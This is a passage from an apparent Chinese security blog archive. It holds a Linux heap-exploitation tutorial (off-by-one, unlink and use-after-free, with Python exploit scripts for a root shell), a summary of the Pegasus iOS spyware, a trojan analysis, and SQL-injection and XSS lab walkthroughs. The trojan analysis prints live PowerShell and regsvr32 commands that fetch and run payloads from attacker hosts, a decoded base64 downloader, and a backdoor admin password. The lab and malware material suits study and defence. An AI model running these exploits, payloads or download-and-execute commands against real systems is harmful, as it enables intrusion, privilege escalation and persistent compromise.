arena。因此伪造的 arena 和块地址作为参数传递给了_int_free。 Step 3：如果块不是 mmap分配的，要获取锁。我们这里块不是mmap配的，伪造的 arena的互斥锁获取成功。 Step 4：合并： 查看上一个块是否空闲，如果空闲则合并。我们这里上一个块已分配，所以不能向后合并。查看下一个块是否空闲，如果空闲则合并。我们这里下一个块已分配，所以不能合并。 Step 5：将当前空闲块放进 unsorted bin中。 使用攻击者生成的数据文件，作为用户输入执行漏洞程序会执行shellcode，像这样： 123456szt@ubuntu:~/linux exploit/test10$ $gcc -g -z norelro -z execstack -o test test.c -Wl,--rpath=/home/szt/glibc/glibc-inst2.20/lib -Wl,--dynamic-linker=/home/szt/glibc/glibc-inst2.20/lib/ld-linux.so.2 szt@ubuntu:~/linux exploit/test10$ gcc -g -o exp exp.c szt@ubuntu:~/linux exploit/test10$ ./exp &gt; file szt@ubuntu:~/linux exploit/test10$ ./test &lt; file ptr found at 0x8048380 good heap allignment found on malloc() 724 (0x80483a0) Off-By-One 漏洞（基于堆）虚拟机安装：Ubuntu 12.04（x86） 将源字符串复制到目标缓冲区可能造成 Off-By-One 漏洞，当源字符串的长度等于目标缓冲区长度的时候。当源字符串的长度等于目标缓冲区长度的时候，单个 NULL 字符会复制到目标缓冲区的上方。因此由于目标缓冲区位于堆上，单个 NULL 字节会覆盖下一个块的块头部，并且这会导致任意代码执行。 漏洞代码： 1234567891011121314151617181920212223242526272829 //consolidate_forward.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #define SIZE 16 int main(int argc, char* argv[]) &#123; int fd = open("./inp_file", O_RDONLY); /* [1] */ if(fd == -1) &#123; printf("File open error\n"); fflush(stdout); exit(-1); &#125; if(strlen(argv[1])&gt;1020) &#123; /* [2] */ printf("Buffer Overflow Attempt. Exiting...\n"); exit(-2); &#125; char* tmp = malloc(20-4); /* [3] */ char* p = malloc(1024-4); /* [4] */ char* p2 = malloc(1024-4); /* [5] */ char* p3 = malloc(1024-4); /* [6] */ read(fd,tmp,SIZE); /* [7] */ strcpy(p2,argv[1]); /* [8] */ free(p); /* [9] */ &#125; 编译命令： 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space $gcc -o consolidate_forward consolidate_forward.c $sudo chown root consolidate_forward $sudo chgrp root consolidate_forward $sudo chmod +s consolidate_forward 上述漏洞代码的行[2]和[8]是基于堆的 off-by-one 溢出发生的地方。目标缓冲区的长度是 1020，因此长度为 1020 的源字符串可能导致任意代码执行。 unlink一个已经处于分配状态的块，会导致任意代码执行，因为任何四个字节的内存区域都能被攻击者的数据覆盖。但是在同一篇文章中，我们也看到，unlink 技巧已经废弃，因为 glibc 近几年来变得更加可靠。具体来说，因为双向链表损坏的条件，任意代码执行时不可能的。但是，Google 的 Project Zero 小组找到了一种方式，来成功绕过双向链表损坏的条件，通过 unlink large 块。 在 glibc malloc 中，主要的环形双向链表由malloc_chunk的fd和bk字段维护，而次要的环形双向链表由malloc_chunk的fd_nextsize和bk_nextsize字段维护。双向链表的加固看起来用在主要（行[1]）和次要（行[4]和[5]）的双向链表上，但是次要的环形双向链表的加固，只是个调试断言语句（不像主要双向链表加固那样，是运行时检查），它在生产构建中没有被编译（至少在 fedora x86中）。因此，次要的环形双向链表的加固（行[4]和[5]）并不重要，这让我们能够向任意 4 个字节的内存区域写入任何数据。所以现在攻击者需要覆盖要被释放的 large 块的malloc_chunk元素。 利用代码： 12345678910111213141516171819202122#exp_try.py #!/usr/bin/env python import structfrom subprocess import call fd = 0xb7ff9712 bk = 0xb7f861b4 fd_nextsize = 0xb7f86157 bk_nextsize = 0x804b430 system = 0xb7e5d0b0 sh = 0xb7f816a0 #endianess convertion def conv(num): return struct.pack("&lt;I",num) buf = conv(fd) buf += conv(bk) buf += conv(fd_nextsize) buf += conv(bk_nextsize) buf += conv(system) buf += conv(sh) buf += "A" * 996 print "Calling vulnerable program" call(["./consolidate_forward", buf]) 执行上述利用代码不会向我们提供 root shell。它向我们提供了一个运行在我们的权限级别的 bash shell 当uid != euid时，/bin/bash会丢弃权限。我们的二进制前向合并的真实uid 是 1000，但是它的有效 uid是 0。因此当system调用时，bash 会丢弃权限，因为真实 uid不等于有效 uid。为了解决这个问题，我们需要在system之前调用setuid(0)，因为_call_tls_dtors()依次遍历tls_dtor_list，我们需要将setuid和system链接，以便获得root shell。 完整利用代码： 12345678910111213141516#gen_file.py #!/usr/bin/env python import struct #dtor_list setuid = 0x4e123e30 setuid_arg = 0x0 mp = 0x804b020 nxt = 0x804b430 #endianess convertion def conv(num): return struct.pack("&lt;I",num) tst = conv(setuid) tst += conv(setuid_arg) tst += conv(mp) tst += conv(nxt) print tst 123456789101112131415161718192021#exp.py #!/usr/bin/env python import struct from subprocess import call fd = 0x0804b418 bk = 0x0804b418 fd_nextsize = 0xb7fe86c0 bk_nextsize = 0x804b008 system = 0x4e0a86e0 sh = 0x80482ce #endianess convertion def conv(num): return struct.pack("&lt;I",num) buf = conv(fd) buf += conv(fd_nextsize) buf += conv(bk_nextsize) buf += conv(system) buf += conv(sh) buf += "A" * 996 print "Calling vulnerable program" call(["./consolidate_forward", buf]) 执行上述利用代码会给我们 root shell 释放后使用虚拟机安装：Ubuntu 12.04（x86） 继续使用已经被释放的堆内存指针叫做释放后使用。这个漏洞会导致任意代码执行。 漏洞代码： 12345678910111213141516171819202122232425 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #define BUFSIZE1 1020 #define BUFSIZE2 ((BUFSIZE1/2) - 4) int main(int argc, char argv) &#123; char* name = malloc(12); /* [1] */ char* details = malloc(12); /* [2] */ strncpy(name, argv[1], 12-1); /* [3] */ free(details); /* [4] */ free(name); /* [5] */ printf("Welcome %s\n",name); /* [6] */ fflush(stdout); char* tmp = (char *) malloc(12); /* [7] */ char* p1 = (char *) malloc(BUFSIZE1); /* [8] */ char* p2 = (char *) malloc(BUFSIZE1); /* [9] */ free(p2); /* [10] */ char* p2_1 = (char *) malloc(BUFSIZE2); /* [11] */ char* p2_2 = (char *) malloc(BUFSIZE2); /* [12] */ printf("Enter your region\n"); fflush(stdout); read(0,p2,BUFSIZE1-1); /* [13] */ printf("Region:%s\n",p2); free(p1); /* [14] */ &#125; 编译命令： 12345#echo 2 &gt; /proc/sys/kernel/randomize_va_space $gcc -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 不像上一篇文章，ASLR 在这里是打开的。所以现在让我们利用 UAF 漏洞，因为 ASLR打开了，让我们使用信息泄露和爆破技巧来绕过它。上面的漏洞代码包含两个 UAF 漏洞，位于行[6]和[13]。它们的堆内存在行[5]和[10]释放，但是它们的指针即使在释放后也使用，在行[6]和[13]。行[6]的UAF 会导致信息泄露，而行[13]的 UAF 导致任意代码执行。 • 行[1]为name分配了 16 字节的堆内存区域。 • 行[2]位details分配了 16 字节的堆内存区域。 • 行[3]将程序的参数1（argv[1]）复制到堆内存区域name中。 • 行[4]和[5]将堆内存区域name和details释放给 glibc malloc。 • 行[6]的printf在释放后使用name指针，这会导致堆地址的泄露。 • 行[7]为tmp分配了 16 字节的堆内存区域。 • 行[8]为p1分配了 1024 字节的堆内存区域。 • 行[9]为p2分配了 1024 字节的堆内存区域。 • 行[10]将堆内存区域p2释放给 glibc malloc。 • 行[11]为p2_1分配了 512 字节的堆内存区域。 • 行[12]为p2_2分配了 512 字节的堆内存区域。 • 行[13]的读取在释放后使用了p2指针。 • 行[14]将堆内存区域p1释放给 glibc malloc。这会在程序退出时导致任意代码执行。 利用代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#exp.py #!/usr/bin/env python import struct* import sys import telnetlib import time ip = '127.0.0.1' port = 1234 def conv(num): return struct.pack("&lt;I",num) def send(data): global con con.write(data) return con.read_until('\n') print " Bruteforcing libc base address" libc_base_addr = 0xb756a000 fd_nextsize = (libc_base_addr - 0x1000) + 0x6c0 system = libc_base_addr + 0x3e6e0 system_arg = 0x80482ae size = 0x200 setuid = libc_base_addr + 0xb9e30 setuid_arg = 0x0 while True: time.sleep(4) con = telnetlib.Telnet(ip, port) laddress = con.read_until('\n') laddress = laddress[8:12] heap_addr_tup = truct.unpack("&lt;I", laddress) heap_addr = heap_addr_tup[0] print " Leaked heap addresses : [0x%x] " %(heap_addr) heap_base_addr = heap_addr - 0x10 fd = heap_base_addr + 0x410 bk = fd bk_nextsize = heap_base_addr + 0x618 mp = heap_base_addr + 0x18 nxt = heap_base_addr + 0x428 print " Constructing fake chunk to overwrite tls_dtor_list" fake_chunk = conv(fd) fake_chunk += conv(bk) fake_chunk += conv(fd_nextsize) fake_chunk += conv(bk_nextsize) fake_chunk += conv(system) fake_chunk += conv(system_arg) fake_chunk += "A" * 484 fake_chunk += conv(size) fake_chunk += conv(setuid) fake_chunk += conv(setuid_arg) fake_chunk += conv(mp) fake_chunk += conv(nxt) print " Successful tls_dtor_list overwrite gives us shell!!" send(fake_chunk) try: con.interact() except: exit(0) 由于在爆破技巧中，我们需要尝试多次（直到成功）。让我们将我们的漏洞二进制test运行为网络服务器，并使用 Shell 教程来确保崩溃时自动重启： 123456789101112#test.sh #!/bin/sh nc_process_id=$(pidof nc) while : do if [[ -z $nc_process_id ]]; then echo "(Re)starting nc..." nc -l -p 1234 -c "./test sploitfun" else echo "nc is running..." fi done 但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。]]></content>
      <categories>
        <category>网络攻防</category>
        <category>Linux (x86) Exploit 开发系列教程</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>Linux开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ios间谍软件Pegasus]]></title>
    <url>%2F2019%2F07%2F20%2Fios%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6Pegasus%2F</url>
    <content type="text"><![CDATA[它是通过点击一个链接来触发攻击，用户点击短信内的链接后，攻击者就会利用3个0day漏洞。所以可以推测，链接的作用就是在后台静默的下载payload，以及木马所需要的各种环境。然后安装间谍软件，随后就能对设备进行全面控制，还能获取设备中的数据，通过麦克风监听对话，跟踪即时通讯应用的对话内容等 通过查询各种资料，将攻击总结为3个阶段。 第一阶段传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4655漏洞 第二阶段越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对 ios 内核两个漏洞(CVE-2016-4656和CVE-2016-4657)的exp还有一个用来下载解密第三阶段软件包的loader。同时，第二阶段结束时，exp会移除/etc/nfs.conf，然后加载/sbin/mount_nfs。为了在重启之后依然留在系统中，Pegasus会把系统守护进程rtbuddyd替换成一个jsc二进制文件，并且创建一个链接到ascript。 第三阶段安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。同时，软件会运行一个lw-install二进制文件，这个文件包含很多关键架构，并且能在用户重启之后仍然驻足系统，良心的是其中还有一些保护功能，防止用户手机变砖。 lw-install首先会检查 ios 版本，对于不同的版本，lw-install会执行不同的命令。 第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。 Pegasus有很多保证私密的功能，他会经常检查手机有没有被其他软件越狱，甚至还包含一个复杂的自毁机制，禁止更新机制，提权机制，检测其他越狱软件等机制。]]></content>
      <categories>
        <category>网络攻防</category>
        <category>IOS间谍软件</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>ios漏洞</tag>
        <tag>间谍软件Pegasus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[木马病毒分析]]></title>
    <url>%2F2019%2F07%2F20%2F%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[2个文件：down.exe和msinfo.exe 主木马程序是 msinfo.exe msinfo.exe的基本信息123456文件大小 ：4,887,552 字节 MD5 ：03A704D98634F761D090AEAD21C7256A CRC32 ：676D51BC File Name ：C:\Documents **and** Settings\Administrator\桌面\system\msinfo.exe Format ：Portable executable **for** 80386 (PE) 文件版本 ：1.0.0.9 并且加入了vmp壳 放入od中运行，显示缺少2个dll文件 分别是wpcap.dll packet.dll，这两个文件推测是网路传输层所需要的文件，可能与木马联网下载有关。 使用PEview查看msinfo.exe。虽然被加壳但是也能看到不止一个函数，查看发现有一些网址和地址，有可能是该木马联网下载的路径和位置。 放入od中运行一段时间，发现资源管理器有1个msinfo.exe进程一直在运行。 通过进程查看器发现该木马自动下载了3个文件。 有2个文件下载到msinfo.exe所在路径文件夹，一个文件下载到C:\Program Files\Common Files这个文件夹下 123C:\Program Files\Common Files\xpwpd.dat C:\Documents **and** Settings\Administrator\桌面\system\wpd.dat C:\Documents **and** Settings\Administrator\桌面\system\csrs.exe down.exe的基本信息123456文件大小 ：27,136 字节 MD5 ：AE173E8562F6BABACB8E09D0D6C29276 CRC32 ：C4F161E6 File Name ：C:\Documents **and** Settings\Administrator\桌面\system\down.exe Format ：Portable executable **for** 80386 (PE) 文件版本 ：5.2.3790.3959 没有加壳 因为其源文件名为CACLS.EXE，我们可以在百度上找到这个文件： 源文件和现在这个文件进行对比： 可以看到，函数基本没有改变。用ProcessMonitor监视down.exe文件执行后的操作 可以看到down.exe访问了系统存放用户密码的文件，并且有修改hash的操作，猜测是用来查询用户名，进行提权操作。 对于下载文件的检测之前msinfo.exe运行后自动下载了3个文件 123C:\Program Files\Common Files\xpwpd.dat C:\Documents **and** Settings\Administrator\桌面\system\wpd.dat C:\Documents **and** Settings\Administrator\桌面\system\csrs.exe 首先用16进制文本编辑器打开C:\Program Files\Common Files\xpwpd.dat 应该是个指路文件，msinfo.exe通过这个指路文件下载wpd.dat和csrs.exe这两个文件。 而wpd.dat文件通过16进制编辑器打开后是乱码 csrs.exe并未加壳，是一个用python写的，利用 pyinstaller 转成exe可执行文件的程序 12345文件名称 ：C:\Documents and Settings\Administrator\桌面\system\csrs.exe 文件大小 ：6466961 字节 文件版本 ：1.0.0.3 MD5 ：6B62B380B8B14B261C5BFDFE7B017CDD CRC32 ：27F5D1F8 在linux中用 python-exe-unpacker-master 解压 解压后的文件： MyExploiter因为我们已经解压出来csrs.exe的文件，里面的MyExploiter是攻击文件的核心，我们将其后缀改为.py并打开这个文件。可以看到部分代码 大概能看出来是利用ms17010漏洞进行攻击，对目标系统添加一个密码为Zxcvbnm.1234的管理员admin$账户，用于控制计算机，同时下载并安装更改了从云端下下来的dll库文件。如下所示： 1234567http://wmi.1217bye.host/S.ps1 powershell.exe IEX (New-Object system.Net.WebClient). http://173.208.139.170/s.txt powershell.exe IEX (New-Object system.Net.WebClient). http://35.182.171.137/s.jpg regsvr32 /u /s /i: http://wmi.1217bye.host:8888/1.txt scrobj.dll®svr32 /u /s /i: http://173.208.139.170/2.txt scrobj.dll®svr32 /u /s /i: http://35.182.171.137/3.txt scrobj.dll&quot; regsvr32 /s /u /n /i:http://173.208.172.202:8888\\s1.txt scrobj.dll ms17010 攻击代码在PYZ-00.pyz_extracted这个文件夹内有569个.pyc的文件，使用uncompyle2-master反汇编成.py文件。 其中有个名为buleAttack的文件，是选择不同操作系统进行攻击 ms17010攻击核心代码是在 ExpMs17010.pyc文件中，将其进行反编译： 这是创建一个添加一个密码为Zxcvbnm.1234的管理员admin$账户。 这是攻击参数，用于攻击 还有从系统文件中获取token，用于提权 Powershell发现MyExploiter中有一段powershell ` 1JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAAvADIALgB0AHgAdAAnACkALgB0AHIAaQBtACgAKQAgAC0AcwBwAGwAaQB0ACAAJwBbAFwAcgBcAG4AXQArACcAfAAlAHsAJABuAD0AJABfAC4AcwBwAGwAaQB0ACgAJwAvACcAKQBbAC0AMQBdADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAXwAsACAAJABuACkAOwBzAHQAYQByAHQAIAAkAG4AOwB9AA==&quot;&amp;powershell.e` 对其进行解密，尝试了众多例如md5，url等加密解密。发现Base64解码有效： 解密后为： 123$wc=New-Object System.Net.WebClient; $wc.DownloadString(&apos;http://wmi.1217bye.host/2.txt&apos;).trim() -split &apos;[\r\n]+&apos;|%&#123;$n=$_.split(&apos;/&apos;)[-1]; $wc.DownloadFile($_, $n);start $n;&#125; 打开powshell里的网站 可以确定，powshell的作用是下载后续木马，对目标计算机进行持续化恶意程序攻击。 后续恶意程序攻击ok.exe1234567文件位置 ：C:\Documents and Settings\Administrator\桌面 文件大小 ：2,241,024 字节 文件描述 ：易语言程序 md5 ：9F86AFAE88B2D807A71F442891DFE3D4 crc32 ：9C3E3E23 Format ：Portable executable **for** 80386 (PE) 版本信息 ：1.0.0.0 发现有vmp壳 通过进程监视器，发现该ok.exe修改了许多内核级dll。经过查找资料发现修改了用户操作系统界面。并且发现，有修改windows内核文件。 还有对操作系统设置，基本用户界面等特性，如创建窗口和发送消息等功能进行修改。 u.exe12345文件位置 ：C:\Documents and Settings\Administrator\桌面\u.exe 文件大小 ：37,888 字节 md5 ：B89B37A90D0A080C34BBBA0D53BD66DF crc32 ：C909DD40 文件版本 ：1.0.0.0 有upx壳，使用upx去壳器去壳 将解压后的exe文件放入IDA中分析。首先找到主函数main 对找到main 中的各个函数，进行分析。 发现sub_4031c0()这是建立一个连接到服务控制管理器并打开它的数据库的函数，通过服务控制管理器监视用户电脑的键盘读写等操作 发现sub_401220()这是个修改dns的函数 将DNS修改为223.5.5.5 8.8.8.8 并且程序还有修改失败的后续操作；]]></content>
      <categories>
        <category>网络攻防</category>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>木马</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL-Labs]]></title>
    <url>%2F2019%2F07%2F14%2FSQL-Labs%2F</url>
    <content type="text"><![CDATA[基于错误的GET单引号字符型注入Id=1 直接过了 基于错误的GET整形注入?id=1%20or%201=1%23 基于错误的GET单引号变形字符型注入?id=2&#39;) --+ 基于错误的GET双引号字符型注入?id=3&quot;)%20--+ 双注入GET单引号字符型注入?id=1&#39; and left(database(),1)=&#39;s&#39; --+ 双注入GET双引号字符型注入?id=1&#39;’ and left(database(),1)=&#39;s&#39; --+ 导出文件GET字符型注入​ ?id=5&#39;)) --+ ​ 布尔型单引号GET盲注​ ?id=2&#39; --+ ​ 基于时间的GET单引号盲注​ ?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23 基于时间的双引号盲注​ ?id=1&quot;andif(ascii(substr(database(),1,1))=115,sleep(3),0) %23 #### 尝试一下基本的： username = admin’ or 1=1# password = admin 发现登录成功，所以存在注入点。 查看一下有多少列，当试到3时报错，说明存在两列字段 username = admin’ or 1=1 order by 3# 12.第12关 这题和上一题基本一样，不同的是username用双引号加括号包裹。 admin”) or 1=1# 13.第13关 这题是单引号加括号闭合，但是输入payload时却没有回显，看来只能用盲注了。 username = admin’) or ascii(substr(database(),1,1))=115# 14.第14关 和Less-13一样，将单引号和括号改成双引号即可。 admin” or 1=1# 15.第15关 和上面一样，将payload改为单引号。 admin’ or 1=1# 16.第16关 admin”) or 1=1# 17.第17关 标题上面写的password reset，所以尝试一下在password一栏里面进行注入。 username = admin password = admin’ or 1=1# 得到了正确的回显，说明方向正确。但是在猜测表的行列时出现了问题，无法显示有多少列。所以尝试一下布尔盲注。 username = admin password = admin’ or ascii(substr(database(),1,1))=115# 得到了正确的回显。 18.第18关 首先我们抓包，可以看到本机的ip地址，查看源码 \1. php \2. $uagent = $_SERVER[‘HTTP_USER_AGENT’]; \3. $IP = $_SERVER[‘REMOTE_ADDR’]; 源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分：User-Agent。 而获取IP则使用了REMOTE_ADDR，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。用已知的用户名登陆一下，并且测试一下X-Forwarded-For和User-Agent。 经过这次尝试可以看到：修改XFF头对IP没有影响，登陆成功会回显你的User-Agent。 这里要输入正确的账号和密码才能绕过账号密码判断，进入处理User-Agent部分。这跟现实中的注册登录再注入是比较贴合。所以注入点就在User-Agent处。 这里我们仍需要根据回显报错来判断INSERT语句结构，首先任意尝试： User-Agent: ‘ updatexml(1,concat(‘#’,(database())),0)–+` 查看源码，我们可以看到uagent是在IP和uname之前的： $insert=”INSERT INTO security.uagents (uagent, ip_address, username) VALUES (‘$uagent’, ‘$IP’, $uname)”; 构造payload &lt;!–￼0–&gt; 1’ union select 1,2,3# 12345678910直接可以得到`1&apos; union select 1,2,database()#` 21.第21关上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，`uname=Dumb`变成了`uname = RHVtYg==`明显这里是经过了base64加密后的数据。那么我们尝试在将值进行base64加密后输入。 1’) union select 1,2,database()#``` 加密后：`base64: RHVtcCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=` 22.第22关 方法和上一关基本一致，闭合用双引号即可。]]></content>
      <categories>
        <category>网络攻防</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2F2019%2F07%2F12%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[Test 1没有过滤，网页源码为 所以payload为: 1&lt;script&gt;alert(123)&lt;/script&gt; Test 2网页源代码为： 发现红框框起来的部分，需要闭合之前的尖括号和双引号，才能引起弹窗，达成跨站脚本攻击。 所以 payload为： 1&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt; Test 3网页源代码： 网页源码中，红框部分为主要部分，用了htmlspecialchars()函数。该函数的作用是将&lt; &gt; / “ “ ‘ ‘这些符号进行转义，并且2处都进行了转义，所以我们使用html事件属性。 我们使用鼠标事件来引起xss弹窗。但是我们首先要闭合之前的单引号。 所以payload为： 1&apos; onmouseover=&apos;alert(2333) 这时我们把鼠标移到搜索框附近就会引起弹窗，攻击成功 ) Test 4与上一关不同的是，出现的第一处发生了htmlspecialchars()转义，第二处过滤了&lt;和&gt;两个符号（替换成空），并将value=后面的单引号换成了双引号。这样我们直接将上题Payload 中单引号换成双引号，最后鼠标滑过触发XSS 。 所以payload为： 1”nmouseover=”lert(2333) Test 5查看网页源代码发现on中间插入下划线_ ，并且发现script也被过滤，所以我们用html链接形式触发xss。首先我们闭合双引号，其次闭合尖括号；然后我们用链接触发xss。 所以payload为： 1&quot;&gt;&lt;a href=&quot;javascript:alert(123)&quot;&gt; 然后点击。便可触发 Test 6首先我们用上次的payload尝试，发现不可行。查看网页源代码，发现有很多关键词都加入了下划线_ 进行了屏蔽，但是查看网页源码，发现我们之前填写的payload并没有被大小写统一，所以我们可以用大小写混用绕过屏蔽。 所以payload为： 1&quot;&gt;&lt;a hRef=&quot;javascript:alert(123)&quot;&gt; 并点击，便能触发xss Test 7用之前的payload，发现并不能，然后查看网页源码。发现许多关键字被屏蔽了，并且被替换成空。我们可使用双写绕过，使得替换后的结果是我们所期望的。首先闭合双引号和尖括号，其次双写绕过。 ) 所以payload： 1&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(123)&quot;&gt; 然后点击，触发弹窗 ) Test 8算了，不尝试之前的payload了，反正就没对过，直接看网页源码吧。 ) 发现几乎所有关键字都被加了下划线_ 都被屏蔽，我们可以使用Unicode编码绕过。 Payload： 1javascrip&amp;#116;:alert(123) 然后点击友情链接，便可以触发xss弹窗。 Test 9尝试之前的payload，发现404了，并为触发弹窗，攻击失败。查看源码，发现多了一个if判断语句。判断内容是是否含有http://，如果没有，就会显示连接不合法之类的。我们可以使用注释绕过 所以payload为： 1javascrip&amp;#116;:alert(123)/*http://*/ Test 10查看网页源码，发现有许多hidden隐藏项，我们可以利用sort函数，并且利用html事件触发来触发xss。 所以 payload为： 1&amp;t_sort=&quot; onmouseover=&quot;alert(123)&quot; type=&quot;text]]></content>
      <categories>
        <category>网络攻防</category>
        <category>XSS跨站脚本攻击</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
</search>
